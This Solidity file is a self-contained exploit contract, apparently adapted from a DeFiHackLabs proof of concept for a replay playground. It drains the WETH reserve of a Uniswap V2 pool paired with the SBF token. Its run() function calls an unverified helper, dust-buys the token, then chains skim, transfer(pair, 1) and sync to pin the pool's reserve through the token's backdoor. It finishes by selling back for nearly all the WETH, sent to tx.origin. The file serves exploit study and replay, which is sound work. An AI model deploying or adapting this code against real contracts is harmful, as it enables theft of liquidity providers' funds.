// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-03-UNI).
// The DeFiHackLabs PoC (test/UNI_exp.sol) runs the ENTIRE attack inline inside
// the payable constructor of `AttackerC` (`new AttackerC{value: 4e-15 ether}()`),
// so there is no post-deploy entrypoint to call and record. This contract is a
// faithful, self-contained copy of that inline attack, moved into a `run()`
// entrypoint so the playground can deploy it and record `run()`. Logic and
// constants are copied verbatim from test/UNI_exp.sol.
//
// Root cause: SamPrisonman (SBF) reroutes the SENDER-side balance write in
// _transfer through an external, hidden "logic" contract
// (`_balances[sender] = result - amount`, no underflow guard). Calling
// pair.skim(pair) then SBF.transfer(pair, 1) lets that backdoor pin the
// SBF/WETH Uniswap V2 pair's SBF balanceOf to 1. pair.sync() then adopts that
// pinned balance as reserve1, collapsing the constant-product price so that
// selling back the attacker's small SBF balance drains virtually the entire
// WETH reserve (~6.5793 WETH, ~$14K).

interface ISamPrisonman {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256)
        external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256, address[] calldata, address, uint256)
        external
        payable;
}

interface IUniswapV2PairLike {
    function skim(address to) external;
    function sync() external;
}

contract UNIDrain {
    address constant SamPrisonman = 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700;
    address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant UniswapV2Pair = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address constant addr1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
    address constant addr2 = 0xaCa4263fFddA9E60C7260AAbA08c2b8F80D63cB1; // unverified "primer" helper

    // Beat 1 — ping the unverified "primer" helper before the drain.
    function run() external payable {
        (bool s1,) = addr2.call(abi.encodeWithSelector(bytes4(0x4f49cd31)));
        s1;

        // Beat 2 — dust-buy SBF with the attacker's entire (4000 wei) balance.
        address[] memory path = new address[](2);
        path[0] = addr1;
        path[1] = SamPrisonman;
        (bool s2,) = UniswapV2Router02.call{value: address(this).balance}(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        s2;

        // Beat 3 — skim(pair): pair self-transfers SBF, backdoor rewrites pair balance to 0.
        (bool s3,) = UniswapV2Pair.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, UniswapV2Pair));
        s3;

        // Beat 4 — transfer(pair, 1): backdoor rewrites pair balance to 1.
        (bool s4,) =
            SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.transfer.selector, UniswapV2Pair, uint256(1)));
        s4;

        // Beat 5 — sync(): pair adopts the pinned balanceOf(pair) = 1 as reserve1.
        (bool s5,) = UniswapV2Pair.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));
        s5;

        uint256 bal = 0;
        (bool s6, bytes memory r6) =
            SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.balanceOf.selector, address(this)));
        if (s6 && r6.length >= 32) {
            bal = abi.decode(r6, (uint256));
        }

        (bool s7,) =
            SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.approve.selector, UniswapV2Router02, type(uint256).max));
        s7;

        // Beat 6 — sell the whole SBF balance into the now-degenerate pool, pulling out ~all the WETH.
        address[] memory path2 = new address[](2);
        path2[0] = SamPrisonman;
        path2[1] = addr1;
        (bool s8,) = UniswapV2Router02.call(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                bal,
                0,
                path2,
                tx.origin,
                block.timestamp
            )
        );
        s8;
    }

    receive() external payable {}
}
